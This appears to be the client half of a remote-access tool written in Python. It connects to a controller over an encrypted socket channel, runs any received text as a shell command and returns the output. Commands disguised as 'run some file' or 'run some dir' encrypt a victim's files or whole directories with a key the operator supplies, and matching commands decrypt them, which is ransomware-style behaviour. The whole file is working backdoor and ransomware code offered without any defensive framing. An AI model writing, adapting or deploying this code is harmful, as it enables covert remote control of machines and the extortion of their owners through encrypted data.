from CryptoLibrary import Encryption, RSA_encryption, AES_encryption
import socket
import hashlib
import time
import subprocess


client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((socket.gethostbyname(socket.gethostname()),999))

public = '''-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDoLiYsRT56t1inNddmjUdlbT/U
Vsw3FZYQLSyhgnuxB8QZVx1vAbVmTczRML3vpcG9VRPNJATAnIO8gce6L8MG9guL
+PwU/LwezNLAorwxyHXOZAsHNvWI9l0+a3Y1AuEH2AQNPBs4fOJPOY1u3QqmedOU
gYKZXkKmV+H9auPu5QIDAQAB
-----END PUBLIC KEY-----'''

publicKey = RSA_encryption().import_rsa_public_key(public.encode())

def sendSymmetricKey(conn):
    key = Encryption().genKey()
    encryptedKey = RSA_encryption().rsa_encryt(publicKey,key)
    while True:
        try:
            conn.send(encryptedKey)
            if conn.recv(1) == b'r':
                conn.send(b'r')
                return key
        except Exception as e:
            print(e)
            pass
        time.sleep(0.5)
        

def recvMessage(conn,cipher):
    while True:
        try:
            header = int(conn.recv(64).decode())
            return cipher.decrypt(conn.recv(header))
        except Exception as e:
            pass
    time.sleep(0.5)
    
    
    
def cmd(command):
    return subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read().decode(errors='repalce').strip()
     

    
def sendMessage(conn,message,cipher):
    message = cipher.encrypt(message.encode())
    header = str(len(message))
    conn.send(header.encode())
    conn.send(message)
print('CLient started..')
cipher = Encryption(sendSymmetricKey(client))
while True:
    try:
        command = recvMessage(client,cipher).decode()
        print(command)
        if "run some file -p" in command:
            path = command.split('-p')[-1].split('-k')[0].strip()
            key = hashlib.md5(command.split('-p')[-1].split('-k')[-1].strip().encode()).digest()
            if AES_encryption(key).encryptFile(path):
                sendMessage(client,"Successfully completed",cipher)
            else:
                sendMessage(client,"Failed",cipher)
                
        elif "dec some file -p" in command:
            path = command.split('-p')[-1].split('-k')[0].strip()
            key = hashlib.md5(command.split('-p')[-1].split('-k')[-1].strip().encode()).digest()
            if AES_encryption(key).decryptFile(path):
                sendMessage(client,"Successfully completed",cipher)
            else:
                sendMessage(client,"Failed",cipher)
                
        elif "run some dir -p" in command:
            path = command.split('-p')[-1].split('-k')[0].strip()
            key = hashlib.md5(command.split('-p')[-1].split('-k')[-1].strip().encode()).digest()
            if AES_encryption(key).encryptDir(path):
                sendMessage(client,"Successfully completed",cipher)
            else:
                sendMessage(client,"Failed",cipher)
                
        elif "dec some dir -p" in command:
            path = command.split('-p')[-1].split('-k')[0].strip()
            key = hashlib.md5(command.split('-p')[-1].split('-k')[-1].strip().encode()).digest()
            if AES_encryption(key).decryptDir(path):
                sendMessage(client,"Successfully completed",cipher)
            else:
                sendMessage(client,"Failed",cipher)
            
        else:
            sendMessage(client,cmd(command),cipher)
            
    except Exception as e:
        print(e)
        pass
    time.sleep(0.5)
